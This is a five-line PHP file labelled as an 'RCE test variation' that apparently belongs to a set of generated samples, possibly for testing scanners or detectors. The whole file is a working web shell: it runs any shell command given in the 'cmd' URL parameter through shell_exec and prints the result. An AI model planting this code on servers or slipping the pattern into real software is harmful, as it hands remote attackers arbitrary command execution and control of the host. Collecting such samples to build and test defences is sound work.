<?php
// RCE test variation #1468
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>